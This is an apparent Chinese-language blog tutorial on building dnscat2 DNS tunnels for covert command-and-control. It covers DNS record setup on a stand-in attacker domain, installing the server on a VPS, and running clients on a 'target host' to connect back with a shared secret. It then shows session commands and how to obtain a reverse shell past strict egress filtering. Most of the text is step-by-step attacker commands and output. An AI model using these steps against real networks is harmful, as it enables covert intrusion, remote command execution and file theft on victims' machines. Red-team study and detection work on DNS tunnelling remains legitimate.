**目录**

[dnscat2](#t0 "dnscat2")

[搭建dnscat2隧道步骤](#t1 "搭建dnscat2隧道步骤")

[（1）：部署域名解析](#t2 "（1）：部署域名解析")

[（2）：安装dnscat2服务端](#t3 "（2）：安装dnscat2服务端")

  [(3）：在目标主机上安装dnscat2客户端](#t4 "  (3）：在目标主机上安装dnscat2客户端")

[（4）：测试客户端服务端是否连通](#t5 "（4）：测试客户端服务端是否连通")

[中继模式建立隧道](#t6 "中继模式建立隧道")

[服务端](#t7 "服务端")

[客户端](#t8 "客户端")

[执行命令](#t9 "执行命令")

* * *

dnscat2
=======

dnscat2是一款开源软件，使用DNS协议创建[加密](https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020)的C&C通道，通过预共享密钥进行身份验证；使用Shell及DNS查询类型(TXT、MX、CNAME、A、AAAA)，多个同时进行的会话类似于SSH中的隧道。dnscat2的客户端是有Windows版和Linux版，服务端是用Ruby语言编写的。严格的说，dnscat2是一个命令与控制工具。

使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。

*   直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求
*   中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢

如果目标内网放行所有的DNS请求，dnscat2会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以 dnscat 开头的，因此防火墙可以很容易地将直连模式的通信检测出来。

如果目标内网的请求仅限于白名单服务器或指定的域，dnscat2会使用中继模式来申请一个域名，并将运行dnscat2服务端的服务器指定为受信任的DNS服务器。

DNS隧道的应用场景如下：在安全策略严格的内网环境中，常见的 C&C 通信端口会被众多安全设备所监控，该网段只允许白名单流量出站，同时其他端口都被屏蔽，传统的C&C通信无法建立。这种情况下，可以通过使用DNS建立隐蔽隧道来进行通信。

dnscat2通过DNS进行控制并执行命令。与同类工具相比，dnscat2具有如下特点：

*   支持多个会话
*   流量加密
*   使用密钥防止MiTM攻击
*   在内存中直接执行PowerShell脚本
*   隐蔽通信

**搭建dnscat2隧道步骤**
-----------------

### **（1）：部署域名解析**

首先，用一台公网的Linux系统的VPS作为C&C服务器(注意：VPS的53端口一定要开放)，并准备好一个可以配置的域名(这里我们假设是hack.com)。然后，去配置域名的记录。首先创建记录A，将自己的域名 www.hack.com 解析到VPS服务器地址。然后，创建NS记录，将 test.hack.com 指向 www.hack.com 。

*   第一条A类解析是在告诉域名系统，www.hack.com 的IP地址是 xx.xx.xx.xx 。
*   第二条NS解析是在告诉域名系统，想要知道 test.hack.com 的IP地址，就去问 www.hack.com 。

![](https://img-blog.csdnimg.cn/20200220235659545.png)

为什么要设置NS类型的记录呢？因为NS类型的记录不是用于设置某个域名的DNS服务器的，而是用于设置某个子域名的DNS服务器的。

**如何验证域名解析设置是否成功？**  
在随便一台电脑上ping域名 www.hack.com ，若能ping通，且显示的IP地址是我们配置的VPS的地址，说明第一条A类解析设置成功并已生效。

![](https://img-blog.csdnimg.cn/20200220235947885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后在我们的VPS上执行以下命令监听UDP53端口

```
tcpdump -n -i eth0 udp dst port 53
```


在任意一台机器上执行  nslookup test.hack.com 命令，如果在我们的VPS监听的端口有查询信息，说明第二条记录设置成功

![](https://img-blog.csdnimg.cn/20200221000107365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### （2）：安装dnscat2服务端

在VPN服务器上安装dnscat2服务端。

```
git clone https://github.com/iagox86/dnscat2.git      
cd dnscat2/server/      
gem install bundler      
bundle install
```


![](https://img-blog.csdnimg.cn/20200221001146475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

###   (3）：在目标主机上安装dnscat2客户端

dnscat2客户端是用C语言编写的，因此在使用前需要先进行编译。

*   如果目标服务器是Windows系统，则可以直接使用编译好的dnscat2客户端，或者PowerShell版本的dnscat2(目标机器需要支持PowerShell2.0以上版本)
*   如果目标服务器是Linux系统，则需要在目标机器上执行如下命令安装客户端。

**Linux安装dnscat2客户端**

```
git clone https://github.com/iagox86/dnscat2.git      
cd dnscat2/client/      
make
```


 ![](https://img-blog.csdnimg.cn/20200221163022917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **（4）：测试客户端服务端是否连通**

服务器目前在监听状态，执行以下命令测试客户端能否与服务器进行通信

```
dnscat2-v0.07-client-win32.exe --ping test.hack.com
```


![](https://img-blog.csdnimg.cn/20200221101628428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，服务器收到了客户端的请求

 ![](https://img-blog.csdnimg.cn/20200221101651294.png)

中继模式建立隧道
--------

### 服务端

在**服务端**执行以下模式进行监听

```
ruby ./dnscat2.rb test.hack.com -e open -c root@123456 --no-cache       
    -e：指定安全级别，open表示服务端运行客户端不进行加密      
    -c：指定密钥      
    --no-cache：禁止缓存，一定添加该选项，因为powershell-dnscat2客户端域dnscat2服务端的Caching模式不兼容
```


![](https://img-blog.csdnimg.cn/20200221101053203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 客户端

**客户端(C语言版本的)**执行以下命令，连接服务端

```
dnscat2-v0.07-client-win32.exe --dns domain=test.hack.com --secret=root@123456
```


如下，客户端显示 Session established！ ，表示连接成功。 

![](https://img-blog.csdnimg.cn/20200221101825133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**客户端(PowerShell版本)**执行以下命令，连接服务端

```
Import-Module .\dnscat2.ps1      
start-Dnscat2 -Domain test.hack.com --secret=root@123456
```


![](https://img-blog.csdnimg.cn/20200221161650302.png)

**客户端(Linux版本)**执行以下命令，连接服务端

```
cd dnscat2/client      
./dnscat --dns domain=test.hack.com --secret=root@123456
```


![](https://img-blog.csdnimg.cn/20200221163328389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 执行命令

我们服务端这边也会显示New window created：1 ，说明新建了一个session

然后我们执行下面命令

```
sessions      #查看当前建立的session      
windows       #查看当前建立的session，和sessions一样      
session -i 1  #进入第一个session，和MSF一样      
window  -i 1  #进入第一个session，和session -i 1一样      
help          #查看命令帮助      
    clear：清屏      
    delay：修改远程响应延时      
    exec ：执行远程机器上的指定程序，例如PowerShell或VBS      
    shell：得到一个反弹的shell      1
    download、upload：上传、下载文件，速度较慢，适合小文件      1
    suspend：返回上一层，相当于使用快捷键 Ctrl+Z      1
    listen：类似于SSH隧道的-L参数(本地转发)      1
    ping：用于确认目标机器是否在线，若返回pong，说明目标机器在线      1
    shutdown：切断当前会话      1
    quit：退出dnscat2控制台      1
    kill id：切断通道      1
    set：设置值，例如设置 security=open
```


![](https://img-blog.csdnimg.cn/20200221153746399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200221155258840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们执行 shell，然后会反弹一个shell过来。接着执行 suspend 返回上一层，sessions查看，可以看到现在有两个session了。session -i 2进入反弹回来的shell，我们就可以执行CMD命令了

```
shell           #得到一个反弹的shell      
suspend         #返回上一层      
session -i  2   #进入反弹过来的shell
```


![](https://img-blog.csdnimg.cn/20200221154442802.png)

![](https://img-blog.csdnimg.cn/20200221154224937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)